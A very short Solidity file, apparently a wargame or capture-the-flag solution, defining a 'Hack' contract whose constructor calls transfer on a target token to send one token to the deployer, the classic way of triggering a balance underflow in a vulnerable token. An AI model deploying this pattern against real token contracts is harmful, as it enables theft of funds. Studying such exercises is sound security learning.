pragma solidity ^0.8;

interface TToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

contract Hack {
    constructor(address _target) {
        TToken(_target).transfer(msg.sender, 1);
    }
}